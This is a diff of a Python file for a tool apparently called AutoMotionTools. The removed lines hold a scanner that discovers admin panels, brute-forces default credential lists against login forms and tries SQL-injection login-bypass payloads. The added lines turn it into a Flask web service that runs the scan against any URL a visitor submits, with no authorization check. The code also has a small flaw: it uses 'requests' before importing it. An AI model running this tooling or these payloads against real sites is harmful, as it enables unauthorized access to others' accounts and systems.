@@ -1,269 +1,76 @@
 #!/usr/bin/env python3
 """
-AutoMotionTools - Core Scanning Engine
-For authorized penetration testing only.
+AutoMotionTools - Flask Web Interface (Render Optimized)
 """
 
+from flask import Flask, render_template, request, jsonify
+import threading
+import os
+import warnings
+warnings.filterwarnings('ignore', category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
+
+# 👇 এই লাইন scanner.py ইমপোর্ট করার আগে বসাতে হবে
 import requests
-import re
-import time
-import json
-from urllib.parse import urljoin
-from bs4 import BeautifulSoup
-from concurrent.futures import ThreadPoolExecutor, as_completed
+from urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-TIMEOUT = 10
-THREADS = 20
-USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+from scanner import AutoMotionScanner
 
-session = requests.Session()
-session.headers.update({"User-Agent": USER_AGENT})
+app = Flask(__name__)
 
-ADMIN_PATHS = [
-    "admin", "admin/", "admin/login.php", "admin/login", "admin/index.php",
-    "administrator", "administrator/", "admin/index.html", "admin/dashboard",
-    "adminpanel", "admin_panel", "admin_area", "panel", "cpanel",
-    "controlpanel", "login", "login.php", "login.html", "login.aspx",
-    "wp-admin", "wp-login.php", "admin/login.aspx", "admin/login.asp",
-    "dashboard", "admin/dashboard.php", "backend", "backend/login",
-    "user/login", "auth", "auth/login", "signin", "signin.php",
-    "portal", "admin/portal.php", "admin/home.php",
-    "phpmyadmin", "phpMyAdmin", "mysql", "dbadmin",
-    "admin/account.php", "admin/users.php", "admin/settings.php",
-    "admin/index.jsp", "admin/home.jsp", "admin/login.jsp",
-    "manager", "manager/login", "console", "console/login",
-]
+scan_results = {}
+scan_status = {}
 
-COMMON_CREDS = [
-    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
-    ("admin", "admin123"), ("admin", "root"), ("admin", "letmein"),
-    ("admin", "pass"), ("admin", "administrator"),
-    ("administrator", "administrator"), ("administrator", "admin"),
-    ("root", "root"), ("root", "admin"), ("root", "toor"),
-    ("user", "user"), ("user", "password"), ("user", "123456"),
-    ("test", "test"), ("test", "123456"), ("guest", "guest"),
-    ("support", "support"), ("admin", "admin@123"),
-    ("admin", "admin12345"), ("admin", "1q2w3e4r"),
-    ("admin", "qwerty"), ("admin", "123456789"),
-    ("admin", "passw0rd"), ("admin", "P@ssw0rd"),
-    ("admin", "admin2024"), ("admin", "Admin@123"),
-    ("admin", "1234"), ("admin", "abc123"),
-]
+@app.route('/')
+def index():
+    return render_template('index.html')
 
-SQLI_PAYLOADS = [
-    ("' OR '1'='1", "' OR '1'='1"),
-    ("admin' --", ""),
-    ("admin' #", ""),
-    ("' OR 1=1 --", ""),
-    ("' OR 1=1 #", ""),
-    ("' OR '1'='1' --", ""),
-    ("' OR '1'='1' #", ""),
-    ("admin' OR '1'='1", ""),
-    ("admin' OR 1=1--", ""),
-    ("\" OR \"1\"=\"1", "\" OR \"1\"=\"1"),
-    ("admin\"--", ""),
-    ("' UNION SELECT 1,1 --", ""),
-    ("' UNION SELECT 1,1 #", ""),
-    ("admin' AND 1=1 --", ""),
-    ("admin'/*", ""),
-]
-
-class AutoMotionScanner:
-    def __init__(self, target_url):
-        self.target_url = target_url.rstrip("/")
-        self.session = requests.Session()
-        self.session.headers.update({"User-Agent": USER_AGENT})
-        self.results = {
-            "target": self.target_url,
-            "admin_panels": [],
-            "login_forms": [],
-            "credentials_found": [],
-            "sqli_bypasses": []
-        }
+@app.route('/scan', methods=['POST'])
+def start_scan():
+    """Start a new scan."""
+    data = request.get_json()
+    target = data.get('target', '').strip()
     
-    def check_path(self, path):
-        """Check if a path is a valid admin/login page."""
-        url = urljoin(self.target_url + "/", path.lstrip("/"))
+    if not target:
+        return jsonify({"error": "Target URL is required"}), 400
+    
+    if not target.startswith(('http://', 'https://')):
+        target = 'https://' + target
+    
+    import time
+    scan_id = str(int(time.time()))
+    scan_status[scan_id] = {"status": "running", "progress": 0, "message": "Initializing..."}
+    
+    def run_scan():
         try:
-            resp = self.session.get(url, timeout=TIMEOUT, allow_redirects=True)
-            if resp.status_code in [200, 301, 302, 401, 403]:
-                content = resp.text.lower()
-                indicators = ["password", "login", "username", "sign in", 
-                            "signin", "admin", "log in", "authenticate"]
-                score = sum(1 for ind in indicators if ind in content)
-                if score >= 2 or resp.status_code in [401, 403]:
-                    return {
-                        "url": url,
-                        "status": resp.status_code,
-                        "score": score,
-                        "title": self._extract_title(resp.text)
-                    }
-        except:
-            pass
-        return None
-    
-    def _extract_title(self, html):
-        try:
-            soup = BeautifulSoup(html, 'html.parser')
-            return soup.title.string.strip() if soup.title else "No Title"
-        except:
-            return "No Title"
-    
-    def find_admin_panels(self, progress_callback=None):
-        """Multi-threaded admin panel discovery."""
-        results = []
-        total = len(ADMIN_PATHS)
-        with ThreadPoolExecutor(max_workers=THREADS) as executor:
-            futures = {executor.submit(self.check_path, p): p for p in ADMIN_PATHS}
-            for i, future in enumerate(as_completed(futures)):
-                result = future.result()
-                if result:
-                    results.append(result)
-                if progress_callback:
-                    progress_callback(int((i+1)/total * 100))
-        self.results["admin_panels"] = results
-        return results
-    
-    def detect_login_forms(self, url):
-        """Detect login forms from a page URL."""
-        try:
-            resp = self.session.get(url, timeout=TIMEOUT)
-            soup = BeautifulSoup(resp.text, 'html.parser')
-            forms = soup.find_all('form')
-            detected = []
+            scanner = AutoMotionScanner(target)
+            scan_status[scan_id] = {"status": "running", "progress": 10, "message": "Discovering admin panels..."}
             
-            for form in forms:
-                form_text = form.get_text().lower()
-                if any(kw in form_text for kw in ['password', 'login', 'sign in', 'signin']):
-                    inputs = form.find_all('input')
-                    fields = {}
-                    for inp in inputs:
-                        name = inp.get('name') or inp.get('id') or ''
-                        type_ = inp.get('type', 'text')
-                        if name:
-                            fields[name] = type_
-                    
-                    action = form.get('action', '')
-                    if action and not action.startswith('http'):
-                        action = urljoin(url, action)
-                    else:
-                        action = url
-                    
-                    method = form.get('method', 'post').upper()
-                    
-                    detected.append({
-                        "page_url": url,
-                        "action": action,
-                        "method": method,
-                        "fields": fields
-                    })
+            results = scanner.full_scan()
             
-            self.results["login_forms"].extend(detected)
-            return detected
+            scan_results[scan_id] = results
+            scan_status[scan_id] = {"status": "complete", "progress": 100, "message": "Scan complete"}
         except Exception as e:
-            return []
+            scan_status[scan_id] = {"status": "error", "progress": 0, "message": str(e)}
     
-    def _attempt_login(self, form_info, username, password):
-        """Try a single credential pair."""
-        action = form_info['action']
-        method = form_info['method']
-        fields = form_info['fields']
-        
-        user_field = None
-        pass_field = None
-        other_fields = {}
-        
-        for fname, ftype in fields.items():
-            fn = fname.lower()
-            if any(kw in fn for kw in ['user', 'email', 'login', 'name']):
-                if not user_field: user_field = fname
-            elif any(kw in fn for kw in ['pass', 'pwd', 'secret']):
-                if not pass_field: pass_field = fname
-            elif ftype == 'hidden':
-                other_fields[fname] = ''
-        
-        if not user_field or not pass_field:
-            return None
-        
-        payload = {user_field: username, pass_field: password}
-        payload.update(other_fields)
-        
-        try:
-            if method == 'POST':
-                resp = self.session.post(action, data=payload, timeout=TIMEOUT, allow_redirects=False)
-            else:
-                resp = self.session.get(action, params=payload, timeout=TIMEOUT, allow_redirects=False)
-            
-            success = False
-            if resp.status_code == 302:
-                success = True
-            elif resp.status_code == 200:
-                content = resp.text.lower()
-                fail_indicators = ['invalid', 'incorrect', 'wrong', 'failed', 'error', 'try again']
-                if not any(ind in content for ind in fail_indicators):
-                    dashboard_indicators = ['dashboard', 'logout', 'welcome', 'admin panel', 'profile']
-                    if any(ind in content for ind in dashboard_indicators):
-                        success = True
-                        # Also check for Set-Cookie as additional confirmation
-                        if 'Set-Cookie' in resp.headers:
-                            success = True
-            
-            if success:
-                return {"username": username, "password": password, "status": resp.status_code}
-        except:
-            pass
-        return None
+    thread = threading.Thread(target=run_scan, daemon=True)
+    thread.start()
     
-    def brute_force_login(self, form_info, custom_creds=None):
-        """Brute force credentials against a form."""
-        creds = custom_creds or COMMON_CREDS
-        results = []
-        with ThreadPoolExecutor(max_workers=5) as executor:
-            futures = {executor.submit(self._attempt_login, form_info, u, p): (u, p) for u, p in creds}
-            for future in as_completed(futures):
-                result = future.result()
-                if result:
-                    results.append(result)
-        
-        self.results["credentials_found"].extend(results)
-        return results
-    
-    def test_sqli_bypass(self, form_info):
-        """Test SQLi auth bypass payloads."""
-        results = []
-        for user_payload, pass_payload in SQLI_PAYLOADS:
-            result = self._attempt_login(form_info, user_payload, pass_payload if pass_payload else "anything")
-            if result:
-                result["payload"] = {"username": user_payload, "password": pass_payload or "anything"}
-                results.append(result)
-        
-        self.results["sqli_bypasses"].extend(results)
-        return results
-    
-    def full_scan(self, progress_callback=None):
-        """Run complete scan: admin panels → forms → creds → SQLi"""
-        output = {"target": self.target_url, "steps": []}
-        
-        # Step 1: Admin Panels
-        panels = self.find_admin_panels()
-        step1 = {"name": "Admin Panel Discovery", "found": len(panels), "results": panels}
-        output["steps"].append(step1)
-        
-        # Step 2-4: For each panel, check forms and attack
-        for panel in panels[:10]:  # Limit to first 10 panels
-            forms = self.detect_login_forms(panel["url"])
-            for form in forms:
-                step2 = {"name": "Login Form Detected", "form": form}
-                output["steps"].append(step2)
-                
-                creds = self.brute_force_login(form)
-                if creds:
-                    step3 = {"name": "Credentials Found", "results": creds}
-                    output["steps"].append(step3)
-                
-                sqli = self.test_sqli_bypass(form)
-                if sqli:
-                    step4 = {"name": "SQLi Bypass Found", "results": sqli}
-                    output["steps"].append(step4)
-        
-        return output
+    return jsonify({"scan_id": scan_id, "status": "started"})
+
+@app.route('/status/<scan_id>')
+def get_status(scan_id):
+    status = scan_status.get(scan_id, {"status": "not_found"})
+    return jsonify(status)
+
+@app.route('/results/<scan_id>')
+def get_results(scan_id):
+    results = scan_results.get(scan_id, None)
+    if results is None:
+        return jsonify({"error": "Results not found or scan still running"}), 404
+    return jsonify(results)
+
+if __name__ == '__main__':
+    # 👇 Render-এর PORT env variable ব্যবহার করুন
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
